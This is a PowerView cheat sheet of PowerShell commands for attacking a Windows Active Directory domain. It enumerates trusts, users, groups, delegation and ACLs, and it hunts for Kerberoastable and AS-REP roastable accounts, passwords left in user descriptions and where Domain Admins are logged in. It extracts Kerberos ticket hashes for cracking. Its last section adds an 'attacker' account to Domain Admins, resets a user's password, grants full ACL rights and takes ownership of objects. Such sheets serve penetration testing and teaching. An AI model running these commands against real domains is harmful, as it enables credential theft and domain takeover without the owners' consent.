# PowerView Cheat Sheet

```powershell
Import-Module .\PowerView.ps1
# Or: . .\PowerView.ps1
```

---

## Domain Info

```powershell
Get-Domain                          # Domain info
Get-DomainController                # List DCs
Get-DomainTrust                     # List trusts
Get-ForestDomain                    # All domains in forest
Get-ForestTrust                     # Forest-level trusts
Get-DomainPolicy                    # Domain and system policies
(Get-DomainPolicy)."system access"  # Password policy
```

---

## Users

```powershell
Get-DomainUser                                         # All users
Get-DomainUser -Identity attacker.01                   # Specific user
Get-DomainUser -SPN                                    # Kerberoastable (SPN set)
Get-DomainUser -PreauthNotRequired                     # AS-REP Roastable
Get-DomainUser -AdminCount 1                           # Protected accounts (AdminSDHolder)
Get-DomainUser | Select-Object SamAccountName, Description, MemberOf
Get-DomainUser | Where-Object { $_.Description -match "pass|pwd|cred" }   # Creds in desc

# Find all users with password never expires
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=65536)"

# Find locked out accounts
Search-ADAccount -LockedOut

# Find inactive accounts
Get-DomainUser -LDAPFilter "(lastLogonTimestamp<=$(([DateTime]::UtcNow.AddDays(-90).ToFileTime())))"
```

---

## Groups

```powershell
Get-DomainGroup                             # All groups
Get-DomainGroup -AdminCount 1               # Protected groups
Get-DomainGroupMember "Domain Admins"       # Members (recursive)
Get-DomainGroupMember "Enterprise Admins" -Recurse

# Find groups with local admin rights on computers
Find-GPOComputerAdmin -ComputerName WS-01.corp.local
```

---

## Computers

```powershell
Get-DomainComputer                           # All computers
Get-DomainComputer -Unconstrained            # Unconstrained delegation
Get-DomainComputer -TrustedToAuth            # Constrained delegation (KCD)
Get-DomainComputer -Printers                 # Print spooler (for Printer Bug)
Get-DomainComputer | Select-Object Name, OperatingSystem, DNSHostName, LastLogonDate

# Find computers with open admin shares
Find-DomainShare
Invoke-ShareFinder -CheckShareAccess

# Find where DA is logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

---

## OUs and GPOs

```powershell
Get-DomainOU                                # List OUs
Get-DomainGPO                               # List GPOs
Get-DomainGPO | Where-Object { $_.DisplayName -match "password|cred" }
Get-DomainGPOComputerLocalGroupMapping       # Local group changes via GPO
```

---

## ACLs

```powershell
# Find interesting ACLs (non-default)
Find-InterestingDomainAcl -ResolveGUIDs

# Check ACL on specific object
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-ObjectAcl -Identity faisal.omar -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "Write|All|Force"
}

# Find ACLs where current user has rights
$currentUser = (Get-DomainUser -Identity $env:USERNAME).distinguishedname
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceDN -eq $currentUser
}
```

---

## Delegation

```powershell
# Unconstrained
Get-DomainUser -TrustedForDelegation
Get-DomainComputer -TrustedForDelegation

# Constrained (KCD)
Get-DomainUser -TrustedToAuth | Select-Object SamAccountName, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object Name, msds-allowedtodelegateto

# RBCD
Get-DomainComputer -Properties msds-allowedtoactonbehalfofotheridentity |
    Where-Object { $_."msds-allowedtoactonbehalfofotheridentity" -ne $null }
```

---

## Kerberoasting with PowerView

```powershell
# Request TGS tickets and export hashes
Request-SPNTicket -SPN "MSSQLSvc/SQL-01.corp.local:1433" -Format Hashcat
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```

---

## Modifying Objects (requires appropriate rights)

```powershell
# Change group membership
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker.01

# Reset password
Set-DomainUserPassword -Identity faisal.omar -AccountPassword (ConvertTo-SecureString "New123!" -AsPlainText -Force)

# Set SPN (for Kerberoasting target creation)
Set-DomainObject -Identity attacker.01 -Set @{serviceprincipalname="fake/spn"}

# Modify ACL
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker.01 -Rights All

# Set object owner
Set-DomainObjectOwner -Identity WEB-SRV-02 -OwnerIdentity attacker.01
```
